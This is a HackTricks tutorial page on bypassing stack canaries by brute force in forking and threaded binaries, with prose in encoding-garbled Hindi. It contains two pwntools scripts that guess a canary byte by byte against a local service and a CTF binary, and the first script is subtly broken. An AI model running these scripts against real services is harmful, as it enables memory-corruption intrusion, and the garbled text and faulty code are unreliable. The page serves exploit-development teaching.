# BF Forked & Threaded Stack Canaries

{% hint style="success" %}
Learn & practice AWS Hacking:<img src="/.gitbook/assets/arte.png" alt="" data-size="line">[**HackTricks Training AWS Red Team Expert (ARTE)**](https://training.hacktricks.xyz/courses/arte)<img src="/.gitbook/assets/arte.png" alt="" data-size="line">\
Learn & practice GCP Hacking: <img src="/.gitbook/assets/grte.png" alt="" data-size="line">[**HackTricks Training GCP Red Team Expert (GRTE)**<img src="/.gitbook/assets/grte.png" alt="" data-size="line">](https://training.hacktricks.xyz/courses/grte)

<details>

<summary>Support HackTricks</summary>

* Check the [**subscription plans**](https://github.com/sponsors/carlospolop)!
* **Join the** ЁЯТм [**Discord group**](https://discord.gg/hRep4RUj7f) or the [**telegram group**](https://t.me/peass) or **follow** us on **Twitter** ЁЯРж [**@hacktricks\_live**](https://twitter.com/hacktricks\_live)**.**
* **Share hacking tricks by submitting PRs to the** [**HackTricks**](https://github.com/carlospolop/hacktricks) and [**HackTricks Cloud**](https://github.com/carlospolop/hacktricks-cloud) github repos.

</details>
{% endhint %}

**рдпрджрд┐ рдЖрдк рдПрдХ рдмрд╛рдЗрдирд░реА рдХрд╛ рд╕рд╛рдордирд╛ рдХрд░ рд░рд╣реЗ рд╣реИрдВ рдЬреЛ рдПрдХ рдХреИрдирд░реА рдФрд░ PIE (рдкреЛрдЬреАрд╢рди рдЗрдВрдбрд┐рдкреЗрдВрдбреЗрдВрдЯ рдПрдХреНрд╕реАрдХреНрдпреВрдЯреЗрдмрд▓) рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рддреЛ рдЖрдкрдХреЛ рд╢рд╛рдпрдж рдЙрдиреНрд╣реЗрдВ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рдПрдХ рддрд░реАрдХрд╛ рдЦреЛрдЬрдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИред**

![](<../../../.gitbook/assets/image (865).png>)

{% hint style="info" %}
рдзреНрдпрд╛рди рджреЗрдВ рдХрд┐ **`checksec`** рдпрд╣ рдирд╣реАрдВ рдкрд╣рдЪрд╛рди рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдПрдХ рдмрд╛рдЗрдирд░реА рдХреИрдирд░реА рджреНрд╡рд╛рд░рд╛ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ рдпрджрд┐ рдЗрд╕реЗ рд╕реНрдерд┐рд░ рд░реВрдк рд╕реЗ рд╕рдВрдХрд▓рд┐рдд рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдпрд╣ рдлрд╝рдВрдХреНрд╢рди рдХреА рдкрд╣рдЪрд╛рди рдХрд░рдиреЗ рдореЗрдВ рдЕрд╕рдорд░реНрде рд╣реИред\
рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЖрдк рдЗрд╕реЗ рдореИрдиреНрдпреБрдЕрд▓ рд░реВрдк рд╕реЗ рджреЗрдЦ рд╕рдХрддреЗ рд╣реИрдВ рдпрджрд┐ рдЖрдк рдкрд╛рддреЗ рд╣реИрдВ рдХрд┐ рдПрдХ рдорд╛рди рдлрд╝рдВрдХреНрд╢рди рдХреЙрд▓ рдХреА рд╢реБрд░реБрдЖрдд рдореЗрдВ рд╕реНрдЯреИрдХ рдореЗрдВ рд╕рд╣реЗрдЬрд╛ рдЧрдпрд╛ рд╣реИ рдФрд░ рдЗрд╕ рдорд╛рди рдХреА рдЬрд╛рдВрдЪ рдирд┐рдХрд╛рд╕реА рд╕реЗ рдкрд╣рд▓реЗ рдХреА рдЬрд╛рддреА рд╣реИред
{% endhint %}

## рдмреНрд░реВрдЯ рдлреЛрд░реНрд╕ рдХреИрдирд░реА

рдПрдХ рд╕рд╛рдзрд╛рд░рдг рдХреИрдирд░реА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рдПрдХ рдкреНрд░реЛрдЧреНрд░рд╛рдо рд╣реИ рдЬреЛ **рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рдХреЗ рд╕рд╛рде рдПрдХ рдирдпрд╛ рдХрдиреЗрдХреНрд╢рди рд╕реНрдерд╛рдкрд┐рдд рдХрд░рддреЗ рд╣реИрдВ рддреЛ рдЪрд╛рдЗрд▓реНрдб рдкреНрд░реЛрд╕реЗрд╕ рдХреЛ рдлреЛрд░реНрдХ рдХрд░рддрд╛ рд╣реИ** (рдиреЗрдЯрд╡рд░реНрдХ рд╕реЗрд╡рд╛), рдХреНрдпреЛрдВрдХрд┐ рд╣рд░ рдмрд╛рд░ рдЬрдм рдЖрдк рдЗрд╕рд╕реЗ рдХрдиреЗрдХреНрдЯ рд╣реЛрддреЗ рд╣реИрдВ **рддреЛ рд╡рд╣реА рдХреИрдирд░реА рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рдПрдЧрд╛**ред

рдлрд┐рд░, рдХреИрдирд░реА рдХреЛ рдмрд╛рдпрдкрд╛рд╕ рдХрд░рдиреЗ рдХрд╛ рд╕рдмрд╕реЗ рдЕрдЪреНрдЫрд╛ рддрд░реАрдХрд╛ рд╣реИ рдмрд╕ рдЗрд╕реЗ **рдЪрд░ рджреНрд╡рд╛рд░рд╛ рдЪрд░ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рдирд╛**, рдФрд░ рдЖрдк рдпрд╣ рдкрддрд╛ рд▓рдЧрд╛ рд╕рдХрддреЗ рд╣реИрдВ рдХрд┐ рдХреНрдпрд╛ рдЕрдиреБрдорд╛рдирд┐рдд рдХреИрдирд░реА рдмрд╛рдЗрдЯ рд╕рд╣реА рдереА рдпрд╣ рдЬрд╛рдВрдЪрдХрд░ рдХрд┐ рдХреНрдпрд╛ рдкреНрд░реЛрдЧреНрд░рд╛рдо рдХреНрд░реИрд╢ рд╣реБрдЖ рд╣реИ рдпрд╛ рдЕрдкрдиреА рдирд┐рдпрдорд┐рдд рдзрд╛рд░рд╛ рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИред рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдореЗрдВ рдлрд╝рдВрдХреНрд╢рди **8 рдмрд╛рдЗрдЯреНрд╕ рдХреИрдирд░реА (x64)** рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕ рдХрд░рддрд╛ рд╣реИ рдФрд░ рдПрдХ рд╕рд╣реА рдЕрдиреБрдорд╛рдирд┐рдд рдмрд╛рдЗрдЯ рдФрд░ рдПрдХ рдЦрд░рд╛рдм рдмрд╛рдЗрдЯ рдХреЗ рдмреАрдЪ рдЕрдВрддрд░ рдХрд░рддрд╛ рд╣реИ рдмрд╕ **рдЬрд╛рдВрдЪрдХрд░** рдХрд┐ рдХреНрдпрд╛ рд╕рд░реНрд╡рд░ рджреНрд╡рд╛рд░рд╛ рдПрдХ **рдкреНрд░рддрд┐рдХреНрд░рд┐рдпрд╛** рд╡рд╛рдкрд╕ рднреЗрдЬреА рдЧрдИ рд╣реИ (рджреВрд╕рд░реА рд╕реНрдерд┐рддрд┐ рдореЗрдВ **рдЕрдиреНрдп рддрд░реАрдХреЗ** рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬреИрд╕реЗ **try/except** рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛):

### рдЙрджрд╛рд╣рд░рдг 1

рдпрд╣ рдЙрджрд╛рд╣рд░рдг 64 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ рд▓реЗрдХрд┐рди рдЗрд╕реЗ 32 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рдЖрд╕рд╛рдиреА рд╕реЗ рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред
```python
from pwn import *

def connect():
r = remote("localhost", 8788)

def get_bf(base):
canary = ""
guess = 0x0
base += canary

while len(canary) < 8:
while guess != 0xff:
r = connect()

r.recvuntil("Username: ")
r.send(base + chr(guess))

if "SOME OUTPUT" in r.clean():
print "Guessed correct byte:", format(guess, '02x')
canary += chr(guess)
base += chr(guess)
guess = 0x0
r.close()
break
else:
guess += 1
r.close()

print "FOUND:\\x" + '\\x'.join("{:02x}".format(ord(c)) for c in canary)
return base

canary_offset = 1176
base = "A" * canary_offset
print("Brute-Forcing canary")
base_canary = get_bf(base) #Get yunk data + canary
CANARY = u64(base_can[len(base_canary)-8:]) #Get the canary
```
### Example 2

рдпрд╣ 32 рдмрд┐рдЯреНрд╕ рдХреЗ рд▓рд┐рдП рд▓рд╛рдЧреВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рд▓реЗрдХрд┐рди рдЗрд╕реЗ рдЖрд╕рд╛рдиреА рд╕реЗ 64 рдмрд┐рдЯреНрд╕ рдореЗрдВ рдмрджрд▓рд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред\
рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдЗрд╕ рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП **рдХрд╛рд░реНрдпрдХреНрд░рдо рдиреЗ рдкрд╣рд▓реЗ рдЗрдирдкреБрдЯ рдХреЗ рдЖрдХрд╛рд░ рдХреЛ рдЗрдВрдЧрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдПрдХ рдмрд╛рдЗрдЯ рдХреА рдЕрдкреЗрдХреНрд╖рд╛ рдХреА** рдФрд░ рдкреЗрд▓реЛрдбред
```python
from pwn import *

# Here is the function to brute force the canary
def breakCanary():
known_canary = b""
test_canary = 0x0
len_bytes_to_read = 0x21

for j in range(0, 4):
# Iterate up to 0xff times to brute force all posible values for byte
for test_canary in range(0xff):
print(f"\rTrying canary: {known_canary} {test_canary.to_bytes(1, 'little')}", end="")

# Send the current input size
target.send(len_bytes_to_read.to_bytes(1, "little"))

# Send this iterations canary
target.send(b"0"*0x20 + known_canary + test_canary.to_bytes(1, "little"))

# Scan in the output, determine if we have a correct value
output = target.recvuntil(b"exit.")
if b"YUM" in output:
# If we have a correct value, record the canary value, reset the canary value, and move on
print(" - next byte is: " + hex(test_canary))
known_canary = known_canary + test_canary.to_bytes(1, "little")
len_bytes_to_read += 1
break

# Return the canary
return known_canary

# Start the target process
target = process('./feedme')
#gdb.attach(target)

# Brute force the canary
canary = breakCanary()
log.info(f"The canary is: {canary}")
```
## Threads

рдПрдХ рд╣реА рдкреНрд░рдХреНрд░рд┐рдпрд╛ рдХреЗ рдереНрд░реЗрдб рднреА **рдПрдХ рд╣реА рдХреИрдирд░реА рдЯреЛрдХрди** рд╕рд╛рдЭрд╛ рдХрд░реЗрдВрдЧреЗ, рдЗрд╕рд▓рд┐рдП рдпрд╣ рд╕рдВрднрд╡ рд╣реЛрдЧрд╛ рдХрд┐ рдпрджрд┐ рдмрд╛рдЗрдирд░реА рд╣рд░ рдмрд╛рд░ рд╣рдорд▓реЗ рдХреЗ рд╣реЛрдиреЗ рдкрд░ рдПрдХ рдирдпрд╛ рдереНрд░реЗрдб рдЙрддреНрдкрдиреНрди рдХрд░рддреА рд╣реИ рддреЛ **рдХреИрдирд░реА рдХреЛ рдмреНрд░реВрдЯ-рдлреЛрд░реНрд╕** рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХреЗред&#x20;

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, рдПрдХ рдереНрд░реЗрдбреЗрдб рдлрд╝рдВрдХреНрд╢рди рдореЗрдВ **рдмрдлрд░ рдУрд╡рд░рдлреНрд▓реЛ** рдЬреЛ рдХреИрдирд░реА рд╕реЗ рд╕реБрд░рдХреНрд╖рд┐рдд рд╣реИ, рдХрд╛ рдЙрдкрдпреЛрдЧ **TLS рдореЗрдВ рд╕рдВрдЧреНрд░рд╣реАрдд рдорд╛рд╕реНрдЯрд░ рдХреИрдирд░реА рдХреЛ рд╕рдВрд╢реЛрдзрд┐рдд рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐, рдпрд╣ рд╕рдВрднрд╡ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ рдХрд┐ рдереНрд░реЗрдб рдХреЗ **рд╕реНрдЯреИрдХ** рдореЗрдВ рдПрдХ **bof** рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдЙрд╕ рдореЗрдореЛрд░реА рд╕реНрдерд┐рддрд┐ рддрдХ рдкрд╣реБрдБрдЪрд╛ рдЬрд╛ рд╕рдХреЗ рдЬрд╣рд╛рдБ TLS рд╕рдВрдЧреНрд░рд╣реАрдд рд╣реИ (рдФрд░ рдЗрд╕рд▓рд┐рдП, рдХреИрдирд░реА)ред\
рдЗрд╕рдХреЗ рдкрд░рд┐рдгрд╛рдорд╕реНрд╡рд░реВрдк, рдпрд╣ рд╢рдорди рдмреЗрдХрд╛рд░ рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдЬрд╛рдВрдЪ рджреЛ рд╕рдорд╛рди (рд╣рд╛рд▓рд╛рдВрдХрд┐ рд╕рдВрд╢реЛрдзрд┐рдд) рдХреИрдирд░реА рдХреЗ рд╕рд╛рде рдХреА рдЬрд╛рддреА рд╣реИред\
рдпрд╣ рд╣рдорд▓рд╛ рдЗрд╕ рд▓реЗрдЦ рдореЗрдВ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ: [http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads](http://7rocky.github.io/en/ctf/htb-challenges/pwn/robot-factory/#canaries-and-threads)

рдЗрд╕рдХреЗ рдЕрд▓рд╛рд╡рд╛, [https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015](https://www.slideshare.net/codeblue\_jp/master-canary-forging-by-yuki-koike-code-blue-2015) рдХреА рдкреНрд░рд╕реНрддреБрддрд┐ рджреЗрдЦреЗрдВ рдЬреЛ рдмрддрд╛рддреА рд╣реИ рдХрд┐ рдЖрдорддреМрд░ рдкрд░ **TLS** рдХреЛ **`mmap`** рджреНрд╡рд╛рд░рд╛ рд╕рдВрдЧреНрд░рд╣реАрдд рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рдФрд░ рдЬрдм рдПрдХ **рдереНрд░реЗрдб** рдХрд╛ **рд╕реНрдЯреИрдХ** рдмрдирд╛рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ рддреЛ рдпрд╣ рднреА `mmap` рджреНрд╡рд╛рд░рд╛ рдЙрддреНрдкрдиреНрди рд╣реЛрддрд╛ рд╣реИ, рдЬреЛ рдкрд┐рдЫрд▓реЗ рд▓реЗрдЦ рдореЗрдВ рджрд┐рдЦрд╛рдП рдЧрдП рдУрд╡рд░рдлреНрд▓реЛ рдХреА рдЕрдиреБрдорддрд┐ рджреЗ рд╕рдХрддрд╛ рд╣реИред

## Other examples & references

* [https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html](https://guyinatuxedo.github.io/07-bof\_static/dcquals16\_feedme/index.html)
* 64 bits, no PIE, nx, BF canary, write in some memory a ROP to call `execve` and jump there.
